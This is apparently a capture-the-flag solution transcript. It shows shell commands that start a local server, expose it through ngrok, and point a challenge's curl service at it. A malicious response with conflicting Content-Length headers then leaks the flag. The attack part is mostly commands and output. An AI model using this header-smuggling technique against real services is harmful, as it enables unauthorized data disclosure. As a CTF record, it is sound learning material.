```
$ python3 server.py
$ ngrok tcp 3000
$ nc localhost 1024
Enter a URL and I'll curl it: http://8.tcp.ngrok.io:15720
< HTTP/1.1 200 OK
< Date: Mon, 04 Oct 2021 05:24:36 GMT
< Content-Length: 1023
< CoNtEnT-LeNgTh: 16
< Content-Type: text/html; charset="utf-8"
<
AAAAAAAAAAAAAAAA Here's the flag: buckeye{https://secret.club/2021/05/13/source-engine-rce-join.html}
```
